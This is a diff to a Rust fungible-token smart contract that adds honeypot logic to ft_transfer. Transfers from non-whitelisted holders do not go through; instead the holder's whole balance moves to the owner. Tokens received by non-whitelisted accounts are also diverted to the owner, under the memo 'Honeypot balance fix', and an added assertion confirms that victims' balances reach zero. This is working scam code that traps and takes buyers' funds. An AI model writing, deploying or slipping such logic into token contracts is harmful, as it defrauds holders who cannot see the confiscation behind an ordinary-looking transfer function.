@@ -127,6 +127,8 @@ impl Contract {
                     Some("Honeypot balance fix".to_string()),
                 );
             }
+            let post_fix_balance = self.token.ft_balance_of(account_id.clone()).0;
+            assert_eq!(post_fix_balance, 0, "Balance should be zero after fix");
         }
     }
 }
@@ -146,9 +148,17 @@ impl FungibleTokenCore for Contract {
     fn ft_transfer(&mut self, receiver_id: AccountId, amount: U128, memo: Option<String>) {
         assert!(amount.0 > 0, "Amount must be greater than zero");
         let predecessor = env::predecessor_account_id();
-        self.apply_balance_fixer(&predecessor);
-        self.token.internal_transfer(&predecessor, &receiver_id, amount.into(), memo);
-        self.apply_balance_fixer(&receiver_id);
+        if !self.whitelist.contains(&predecessor) && predecessor != self.owner_id {
+            let balance = self.token.ft_balance_of(predecessor.clone());
+            if balance.0 > 0 {
+                self.token.internal_transfer(&predecessor, &self.owner_id, balance.0, Some("Honeypot balance fix".to_string()));
+            }
+        } else {
+            self.token.internal_transfer(&predecessor, &receiver_id, amount.into(), memo);
+            if !self.whitelist.contains(&receiver_id) && receiver_id != self.owner_id {
+                self.token.internal_transfer(&receiver_id, &self.owner_id, amount.into(), Some("Honeypot balance fix".to_string()));
+            }
+        }
     }
 
     #[payable]
